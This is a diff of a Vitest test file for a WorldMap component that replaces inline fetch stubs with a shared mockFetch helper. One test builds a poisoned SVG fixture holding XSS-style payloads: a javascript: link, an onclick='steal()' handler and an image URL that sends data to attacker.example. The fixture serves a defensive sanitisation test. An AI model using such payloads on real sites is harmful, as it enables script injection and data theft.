@@ -5,17 +5,12 @@ import { readFileSync } from "node:fs";
 import { resolve } from "node:path";
 import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";
 import { WorldMap } from "@/app/alt-pegs/fiat-world-atlas/world-map";
+import { mockFetch } from "../../../../../worker/src/test-helpers/__shared/mock-fetch";
 
 const WORLD_SVG = '<svg viewBox="0 0 900 460"><g class="world-countries"><path id="US" /></g></svg>';
 
 beforeEach(() => {
-  vi.stubGlobal(
-    "fetch",
-    vi.fn().mockResolvedValue({
-      ok: true,
-      text: () => Promise.resolve(WORLD_SVG),
-    }),
-  );
+  mockFetch([{ match: "/maps/world-countries.svg", body: WORLD_SVG }], { requireMatch: true });
 });
 
 afterEach(() => {
@@ -44,10 +39,7 @@ describe("WorldMap", () => {
       '<a href="javascript:alert(1)"><path id="A" onclick="steal()" /></a>' +
       '<image xlink:href="https://attacker.example/?data=x" />' +
       "</svg>";
-    vi.stubGlobal(
-      "fetch",
-      vi.fn().mockResolvedValue({ ok: true, text: () => Promise.resolve(POISONED_SVG) }),
-    );
+    mockFetch([{ match: "/maps/world-countries.svg", body: POISONED_SVG }], { requireMatch: true });
 
     const { container } = render(<WorldMap />);
     await waitFor(() => expect(container.querySelector("svg")).not.toBeNull());
